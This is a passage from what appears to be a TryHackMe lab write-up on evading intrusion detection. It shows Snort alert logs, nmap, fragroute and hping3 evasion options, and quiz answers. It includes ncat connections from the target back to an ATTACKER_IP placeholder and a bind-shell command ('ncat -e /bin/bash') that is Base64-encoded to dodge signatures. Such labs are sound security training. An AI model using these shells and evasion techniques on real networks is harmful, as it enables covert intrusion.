<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>01</span><span class=p>/</span><span class=n>14</span><span class=p>-</span><span class=n>12</span><span class=p>:</span><span class=n>51</span><span class=p>:</span><span class=n>26</span><span class=p>.</span><span class=n>717401</span> <span class=n>10</span><span class=p>.</span><span class=n>14</span><span class=p>.</span><span class=n>17</span><span class=p>.</span><span class=n>226</span><span class=p>:</span><span class=n>45480</span> <span class=p>-&gt;</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>112</span><span class=p>.</span><span class=n>168</span><span class=p>:</span><span class=n>80</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=n>TCP</span> <span class=n>TTL</span><span class=p>:</span><span class=n>63</span> <span class=n>TOS</span><span class=p>:</span><span class=n>0x0</span> <span class=n>ID</span><span class=p>:</span><span class=n>34278</span> <span class=n>IpLen</span><span class=p>:</span><span class=n>20</span> <span class=n>DgmLen</span><span class=p>:</span><span class=n>541</span> <span class=n>DF</span>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=p>***</span><span class=n>AP</span><span class=p>***</span> <span class=n>Seq</span><span class=p>:</span> <span class=n>0x26B5C2F</span>  <span class=n>Ack</span><span class=p>:</span> <span class=n>0x0</span>  <span class=n>Win</span><span class=p>:</span> <span class=n>0x0</span>  <span class=n>TcpLen</span><span class=p>:</span> <span class=n>32</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a><span class=p>[**]</span> <span class=p>[</span><span class=n>1</span><span class=p>:</span><span class=n>1000031</span><span class=p>:</span><span class=n>1</span><span class=p>]</span> <span class=n>Netcat</span> <span class=n>Exploitation</span> <span class=p>[**]</span>
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a><span class=p>[</span><span class=n>Priority</span><span class=p>:</span> <span class=n>0</span><span class=p>]</span> 
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a><span class=n>01</span><span class=p>/</span><span class=n>14</span><span class=p>-</span><span class=n>12</span><span class=p>:</span><span class=n>51</span><span class=p>:</span><span class=n>26</span><span class=p>.</span><span class=n>717401</span> <span class=n>10</span><span class=p>.</span><span class=n>14</span><span class=p>.</span><span class=n>17</span><span class=p>.</span><span class=n>226</span><span class=p>:</span><span class=n>45480</span> <span class=p>-&gt;</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>112</span><span class=p>.</span><span class=n>168</span><span class=p>:</span><span class=n>80</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a><span class=n>TCP</span> <span class=n>TTL</span><span class=p>:</span><span class=n>63</span> <span class=n>TOS</span><span class=p>:</span><span class=n>0x0</span> <span class=n>ID</span><span class=p>:</span><span class=n>34278</span> <span class=n>IpLen</span><span class=p>:</span><span class=n>20</span> <span class=n>DgmLen</span><span class=p>:</span><span class=n>541</span> <span class=n>DF</span>
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a><span class=p>***</span><span class=n>AP</span><span class=p>***</span> <span class=n>Seq</span><span class=p>:</span> <span class=n>0x26B5C2F</span>  <span class=n>Ack</span><span class=p>:</span> <span class=n>0xF1090882</span>  <span class=n>Win</span><span class=p>:</span> <span class=n>0x3F</span>  <span class=n>TcpLen</span><span class=p>:</span> <span class=n>32</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a><span class=n>TCP</span> <span class=n>Options</span> <span class=p>(</span><span class=n>3</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=n>NOP</span> <span class=n>NOP</span> <span class=n>TS</span><span class=p>:</span> <span class=n>2244530364</span> <span class=n>287085341</span>
</code></pre></div> <p>There are a few points to make about signature-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> and its rules. If the attacker made even the slightest changes to avoid using <code>ncat</code> verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> or IPS is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address <code>10.10.112.168</code>. What is the IP address running the port scan?</p> <blockquote> <p>Ans: 10.14.17.226</p> </blockquote> </details> <h2 id=task-4-evasion-via-protocol-manipulation><strong>Task 4: Evasion via Protocol Manipulation</strong><a class=headerlink href=#task-4-evasion-via-protocol-manipulation title="Permanent link">&para;</a></h2> <p><img alt src=image-5.png></p> <p>Evading a signature-based <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS requires that you manipulate your traffic so that it does not match any <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS signatures. Here are four general approaches you might consider to evade <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS systems.</p> <ol> <li>Evasion via Protocol Manipulation</li> <li>Evasion via Payload Manipulation</li> <li>Evasion via Route Manipulation</li> <li>Evasion via Tactical Denial of Service (<abbr title="Denial of Service (DoS) is an attack on the target's availability to make the target service/system unavailable to legitimate users.">DoS</abbr>)</li> </ol> <p><img alt src=image-6.png></p> <p>This room focuses on evasion using <code>nmap</code> and <code>ncat</code>/<code>socat</code>. The evasion techniques related to <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> are discussed in great detail in the <a href=../redteamfirewalls/ >Firewalls</a> room. This room will emphasize ncat and socat where appropriate.</p> <p>We will expand on each of these approaches in its own task. Let’s start with the first one. Evasion via protocol manipulation includes:</p> <ul> <li>Relying on a different protocol</li> <li>Manipulating (Source) <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr>/<abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> port</li> <li>Using session splicing (IP packet fragmentation)</li> <li>Sending invalid packets</li> </ul> <p><img alt src=image-7.png></p> <h3 id=rely-on-a-different-protocol><strong>Rely on a Different Protocol</strong><a class=headerlink href=#rely-on-a-different-protocol title="Permanent link">&para;</a></h3> <p>The <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> instead of <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> or rely on <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don’t create too much noise.</p> <p>We have an IPS set to block DNS queries and <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS.</p> <p><img alt src=image-8.png></p> <p>Consider the case where you are using <a href=https://nmap.org/ncat>Ncat</a>. Ncat, by default, uses a <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> connection; however, you can get it to use <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> using the option <code>-u</code>.</p> <p>To listen using <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr>, just issue <code>ncat -lvnp PORT_NUM</code> where port number is the port you want to listen to. to connect to an Ncat instance listening on a <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> port, you can issue <code>ncat TARGET_IP PORT_NUM</code></p> <p>Note that:</p> <ul> <li><code>-l</code> tells <code>ncat</code> to listen for incoming connections</li> <li><code>-v</code> gets more verbose output as <code>ncat</code> binds to a source port and receives a connection</li> <li><code>-n</code> avoids resolving hostnames</li> <li><code>-p</code> specifies the port number that <code>ncat</code> will listen on</li> </ul> <p>As already mentioned, using <code>-u</code> will move all communications over <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr>.</p> <ul> <li>To listen using <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr>, just issue <code>ncat -ulvnp PORT_NUM</code> where port number is the port you want to listen to. Note that unless you add <code>-u</code>, <code>ncat</code> will use <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> by default.</li> <li>To connect to an Ncat instance listening on a <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> port, you can issue <code>nc -u TARGET_IP PORT_NUM</code> Consider the following two examples:</li> </ul> <p>Running <code>ncat -lvnp 25</code> on the attacker system and connecting to it will give the impression that it is a usual <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> connection with an <abbr title="Simple Mail Transfer Protocol (SMTP) is a protocol used to send the email to an SMTP server, more specifically to a Mail Submission Agent (MSA) or a Mail Transfer Agent (MTA).">SMTP</abbr> server, unless the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS provides deep packet inspection (DPI). Executing <code>ncat -ulvnp 162</code> on the attacker machine and connecting to it will give the illusion that it is a regular <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> communication with an SNMP server unless the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS supports DPI.</p> <h3 id=manipulate-source-tcpudp-port><strong>Manipulate (Source) <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr>/<abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> Port</strong><a class=headerlink href=#manipulate-source-tcpudp-port title="Permanent link">&para;</a></h3> <p>Generally speaking, the <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> and <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involving <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> port 22 would be interpreted as <abbr title="Secure Shell (SSH) refers to a cryptographic network protocol used in secure communication between devices. SSH encrypts data using cryptographic algorithms, such as Advanced Encryption System (AES) and is often used when logging in remotely to a computer or server.">SSH</abbr> traffic unless the security solution can analyze the data carried by the <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> segments.</p> <p>Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr>, you can add the option <code>-g PORT_NUMBER</code> (or <code>--source-port PORT_NUMBER</code>) to make <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> send all its traffic from a specific source port number.</p> <p>While scanning a target, use <code>nmap -sS -Pn -g 80 -F MACHINE_IP</code> to make the port scanning traffic appear to be exchanged with an <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> server at first glance.</p> <p>If you are interested in scanning <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> ports, you can use <code>nmap -sU -Pn -g 53 -F MACHINE_IP</code> to make the traffic appear to be exchanged with a DNS server.</p> <p><img alt src=image-9.png></p> <p>Consider the case where you are using <a href=https://nmap.org/ncat>Ncat</a>. You can try to camouflage the traffic as if it is some DNS traffic.</p> <ul> <li>On the attacker machine, if you want to use Ncat to listen on <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> port 53, as a DNS server would, you can use <code>ncat -ulvnp 53</code>.</li> <li>On the target, you can make it connect to the listening server using <code>ncat -u ATTACKER_IP 53</code>.</li> </ul> <p>Alternatively, you can make it appear more like web traffic where clients communicate with an <abbr title="Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.">HTTP</abbr> server.</p> <ul> <li>On the attacker machine, to get Ncat to listen on <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> port 80, like a benign web server, you can use <code>ncat -lvnp 80</code>.</li> <li>On the target, connect to the listening server using <code>nc ATTACKER_IP 80</code>.</li> </ul> <p><img alt src=image-10.png></p> <h3 id=use-session-splicing-ip-packet-fragmentation><strong>Use Session Splicing (IP Packet Fragmentation)</strong><a class=headerlink href=#use-session-splicing-ip-packet-fragmentation title="Permanent link">&para;</a></h3> <p>Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> signatures. If the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> reassembles the packets, the rule won’t be triggered.</p> <p><abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> offers a few options to fragment packets. You can add:</p> <ul> <li><code>-f</code> to set the data in the IP packet to 8 bytes.</li> <li><code>-ff</code> to limit the data in the IP packet to 16 bytes at most.</li> <li><code>--mtu SIZE</code> to provide a custom size for data carried within the IP packet. The size should be a multiple of 8. Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as <a href=https://www.monkey.org/~dugsong/fragroute/ >Fragroute</a>. <code>fragroute</code> can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with <code>ip_frag SIZE</code> to fragment the IP data according to the provided size. The size should be a multiple of 8.</li> </ul> <p>For example, you can create a configuration file <code>fragroute.conf</code> with one line, <code>ip_frag 16</code>, to fragment packets where IP data fragments don’t exceed 16 bytes. Then you would run the command <code>fragroute -f fragroute.conf HOST</code>. The host is the destination to which we would send the fragmented packets it.</p> <h3 id=sending-invalid-packets><strong>Sending Invalid Packets</strong><a class=headerlink href=#sending-invalid-packets title="Permanent link">&para;</a></h3> <p>Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge.</p> <p><abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have:</p> <ul> <li>Invalid <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr>/<abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> checksum</li> <li>Invalid <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> flags</li> </ul> <p><abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> lets you send packets with a wrong <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr>/<abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> checksum using the option <code>--badsum</code>. An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program.</p> <p><abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> also lets you send packets with custom <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> flags, including invalid ones. The option <code>--scanflags</code> lets you choose which flags you want to set.</p> <ul> <li><code>URG</code> for Urgent</li> <li><code>ACK</code> for Acknowledge</li> <li><code>PSH</code> for Push</li> <li><code>RST</code> for Reset</li> <li><code>SYN</code> for Synchronize</li> <li><code>FIN</code> for Finish</li> </ul> <p>For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use <code>--scanflags SYNRSTFIN</code>, although this combination might not be beneficial for your purposes.</p> <p>If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as <code>hping3</code>. We will list a few example options to give you an idea of packet crafting using <code>hping3</code>.</p> <ul> <li><code>-t</code> or <code>--ttl</code> to set the Time to Live in the IP header</li> <li><code>-b</code> or <code>--badsum</code> to send packets with a bad <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr>/<abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> checksum</li> <li><code>-S</code>, <code>-A</code>, <code>-P</code>, <code>-U</code>, <code>-F</code>, <code>-R</code> to set the <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> SYN, ACK, PUSH, URG, FIN, and RST flags, respectively</li> </ul> <p>There is a myriad of other options. Depending on your needs, you might want to check the <code>hping3</code> manual page for the complete list.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Question: We use the following <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> command, <code>nmap -sU -F MACHINE_IP</code>, to launch a <abbr title="User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.">UDP</abbr> scan against our target. What is the option we need to add to set the source port to 161?</p> <blockquote> <p>Ans: -g 161</p> </blockquote> <p>Question: The target allows Telnet traffic. Using <code>ncat</code>, how do we set a listener on the Telnet port?</p> <blockquote> <p>Ans: ncat -lvnp 23</p> </blockquote> <p>Question: We are scanning our target using <code>nmap -sS -F MACHINE_IP</code>. We want to fragment the IP packets used in our <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> scan so that the data size does not exceed 16 bytes. What is the option that we need to add?</p> <blockquote> <p>Ans: -FF</p> </blockquote> <p>Start the AttackBox and the attached machine. Consider the following three types of <abbr title="Nmap (Network Mapper) is a open-source tool used for network discovery and security auditing. It also assists in the exploration of network hosts and services, providing information about open ports, operating systems, and other details.">Nmap</abbr> scans:</p> <ul> <li><code>-sX</code> for Xmas Scan</li> <li><code>-sF</code> for FIN Scan</li> <li><code>-sN</code> for Null Scan</li> </ul> <p>Which of the above three arguments would return meaningful results when scanning <code>MACHINE_IP</code>?</p> <blockquote> <p>Ans: -sF</p> </blockquote> <p>Question: What is the option in <code>hping3</code> to set a custom <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> window size?</p> <blockquote> <p>Ans: -w</p> </blockquote> </details> <h2 id=task-5-evasion-via-payload-manipulation><strong>Task 5: Evasion via Payload Manipulation</strong><a class=headerlink href=#task-5-evasion-via-payload-manipulation title="Permanent link">&para;</a></h2> <p>Evasion via payload manipulation includes:</p> <ul> <li>Obfuscating and encoding the payload</li> <li>Encrypting the communication channel</li> <li>Modifying the shellcode</li> </ul> <p><img alt src=image-11.png></p> <h3 id=obfuscate-and-encode-the-payload><strong>Obfuscate and Encode the Payload</strong><a class=headerlink href=#obfuscate-and-encode-the-payload title="Permanent link">&para;</a></h3> <p>Because the <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr> rules are very specific, you can make minor changes to avoid detection. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication.</p> <p>Consider the command <code>ncat -lvnp 1234 -e /bin/bash</code>, where <code>ncat</code> will listen on <abbr title="Transmission Control Protocol (TCP) is a connection-oriented protocol requiring a TCP three-way-handshake to establish a connection. TCP provides reliable data transfer, flow control and congestion control. Higher-level protocols such as HTTP, POP3, IMAP and SMTP use TCP.">TCP</abbr> port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that you can apply to your command to avoid triggering <abbr title="Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.">IDS</abbr>/IPS signatures.</p> <h3 id=encode-to-base64-format><strong>Encode to Base64 format</strong><a class=headerlink href=#encode-to-base64-format title="Permanent link">&para;</a></h3> <p>You can use one of the many online tools that encode your input to Base64. Alternatively, you can use <code>base64</code> commonly found on <abbr title="Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.">Linux</abbr> systems.</p> <div class=highlight><span class=filename>Pentester Terminal</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=n>pentester</span><span class=nv>@TryHackMe</span><span class=p>$</span> <span class=nb>cat </span><span class=n>input</span><span class=p>.</span><span class=n>txt</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=n>ncat</span> <span class=n>-lvnp</span> <span class=n>1234</span> <span class=n>-e</span> <span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=p>$</span> <span class=n>base64</span> <span class=n>input</span><span class=p>.</span><span class=n>txt</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=n>bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA</span><span class=p>==</span>
